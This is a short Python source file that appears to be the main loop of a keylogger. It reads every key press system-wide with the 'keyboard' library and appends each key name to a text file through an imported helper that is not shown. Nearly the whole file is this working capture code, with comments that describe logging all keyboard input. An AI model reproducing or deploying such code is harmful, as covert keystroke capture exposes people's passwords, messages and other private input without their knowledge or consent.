import keyboard 
from func import *

###  Program main, basically holding the program in an infinite while loop, 
####  reads all keyboard events (inputs) and adds it to the txt 
#####  depicted in the workingDir function

while True:
    ## initiation the session by reading all keyboard events
    
    keyEvent = keyboard.read_event()
    if keyEvent.event_type == keyboard.KEY_DOWN:
        ## replacing the 'space' hotkey with an actual space to improve readability
        
        if keyEvent.name == 'space':
            outTxt(' ')
        else:
            ## sending all other outputs to the text file via outTxt
            
            outTxt(keyEvent.name)
        
